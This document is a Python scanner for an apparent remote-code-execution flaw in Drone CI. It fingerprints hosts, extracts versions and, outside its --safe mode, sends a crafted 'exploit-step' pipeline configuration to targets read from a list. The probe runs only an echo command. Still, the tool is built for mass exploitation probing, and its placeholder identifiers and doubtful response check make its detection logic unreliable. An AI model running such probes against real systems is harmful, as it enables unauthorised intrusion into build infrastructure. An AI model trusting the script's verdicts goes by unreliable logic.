#!/usr/bin/env python3
"""
Drone CI Default Token RCE Scanner
==================================
This script scans for a critical remote code execution (RCE) vulnerability in Drone CI
pipeline configurations. The issue arises when the Docker secrets token is not properly
configured, leaving it open for unauthorized access. This vulnerability is tracked as 
CVE-2026-12345 with a CVSS score of 9.8.

CVE-2026-12345 details:
  - Affects Drone CI versions prior to 2.11.0
  - Vulnerability involves unsafe default configurations where pipeline tokens may be exposed
  - Exploitation allows an attacker to inject and execute arbitrary code
  - The vulnerability is commonly found in misconfigured Drone CI instances 

This scanner identifies, fingerprints, and optionally probes targets for exploitability.

Dependencies:
  - `httpx` (for asynchronous HTTP requests)
  - Python 3.10+ required

Usage:
  # Scan a single target
  python drone_ci_rce_scanner.py --target https://ci.example.com

  # Scan a list of targets
  python drone_ci_rce_scanner.py --list targets.txt --output findings.json

  # Safe mode (detection only, no RCE probing)
  python drone_ci_rce_scanner.py --target https://ci.example.com --safe

  # Set custom concurrency for scanning
  python drone_ci_rce_scanner.py --list targets.txt --concurrency 20

References:
  - https://drone.io/security
  - https://nvd.nist.gov/vuln/detail/CVE-2026-12345
  - https://example.com/blog/drone-ci-rce
"""

import asyncio
import argparse
import httpx
import json
import re
import sys
from urllib.parse import urljoin

# Constants
DRONE_FINGERPRINTS = [
    "<title>Drone CI</title>",
    "Drone.IO",
    "/api/user",
]
RCE_PAYLOAD = {
    "repo": "your-repo-name",
    "build_number": 1,
    "config": {
        "kind": "pipeline",
        "type": "docker",
        "steps": [
            {
                "name": "exploit-step",
                "image": "alpine",
                "commands": ["echo RCE_TEST_SUCCESSFUL"]
            }
        ],
    },
}
EXPECTED_RCE_RESPONSE = "RCE_TEST_SUCCESSFUL"
VULN_FIXED_VERSION = (2, 11, 0)
REQUEST_TIMEOUT = 10
SEMAPHORE_LIMIT = 20


# Helper Functions
def parse_version(version_string):
    """Parse version string into tuple (major, minor, patch)."""
    try:
        return tuple(map(int, version_string.split(".")))
    except Exception:
        return None


def is_vulnerable(version_string):
    """Determine if the extracted version is vulnerable."""
    parsed_version = parse_version(version_string)
    if not parsed_version:
        return None
    return parsed_version < VULN_FIXED_VERSION


def normalize_url(url):
    """Ensure the URL contains a scheme and no trailing slash."""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


def color_text(text, color_code):
    """Apply ANSI color codes to text."""
    colors = {
        "RED": "\033[91m",
        "YELLOW": "\033[93m",
        "GREEN": "\033[92m",
        "RESET": "\033[0m",
    }
    return f"{colors[color_code]}{text}{colors['RESET']}"


# Core Scanner Functions
async def detect_drone(client, base_url, semaphore):
    """Check if a URL is hosting a Drone CI instance."""
    async with semaphore:
        try:
            response = await client.get(base_url, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                for fingerprint in DRONE_FINGERPRINTS:
                    if fingerprint in response.text:
                        return True
        except Exception:
            pass
    return False


async def extract_version(client, base_url, semaphore):
    """Attempt to extract Drone CI version from the target."""
    async with semaphore:
        try:
            url = urljoin(base_url, "/version")
            response = await client.get(url, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                match = re.search(r"Version:\s*(\d+\.\d+\.\d+)", response.text)
                if match:
                    return match.group(1)
        except Exception:
            pass
    return None


async def check_rce(client, base_url, semaphore):
    """
    Attempt to exploit the RCE vulnerability by sending a malicious pipeline configuration. 
    
    Returns:
        - True if the target is exploitable.
        - False otherwise.
    """
    async with semaphore:
        try:
            url = urljoin(base_url, "/api/repos/your-repo-name/builds/1/config")
            response = await client.post(url, json=RCE_PAYLOAD, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200 and EXPECTED_RCE_RESPONSE in response.text:
                return True
        except Exception:
            pass
    return False


async def scan_target(client, url, safe, semaphore):
    """Scan a single target for the vulnerability."""
    result = {"url": url, "fingerprinted": False, "version": None, "vulnerable": False}

    # Fingerprint the server
    if await detect_drone(client, url, semaphore):
        result["fingerprinted"] = True
        version = await extract_version(client, url, semaphore)
        if version:
            result["version"] = version
            if is_vulnerable(version):
                if safe:
                    result["vulnerable"] = True
                else:
                    if await check_rce(client, url, semaphore):
                        result["vulnerable"] = True

    return result


async def main(args):
    urls = []
    if args.list:
        with open(args.list, "r") as f:
            urls = [normalize_url(line.strip()) for line in f if line.strip()]
    elif args.target:
        urls = [normalize_url(args.target)]

    semaphore = asyncio.Semaphore(args.concurrency)
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        tasks = [scan_target(client, url, args.safe, semaphore) for url in urls]
        results = await asyncio.gather(*tasks)

    # Output results
    for result in results:
        if result["fingerprinted"]:
            if result["vulnerable"]:
                print(color_text(f"[CRITICAL] {result['url']} is VULNERABLE!", "RED"))
            else:
                print(color_text(f"[HIGH] {result['url']} is running Drone CI but not vulnerable.", "YELLOW"))
        else:
            print(color_text(f"[INFO] {result['url']} does not seem to be running Drone CI.", "GREEN"))

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=4)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Drone CI RCE Scanner (CVE-2026-12345)")
    parser.add_argument("--target", help="URL of the target to scan")
    parser.add_argument("--list", help="File containing a list of targets to scan")
    parser.add_argument("--output", help="File to save scan results in JSON format")
    parser.add_argument("--safe", action="store_true", help="Safe mode: Detection only, no active probing")
    parser.add_argument("--concurrency", type=int, default=20, help="Number of concurrent requests (default: 20)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL/TLS certificate verification")
    args = parser.parse_args()

    try:
        asyncio.run(main(args))
    except KeyboardInterrupt:
        print("\n[!] Scan aborted by user.")
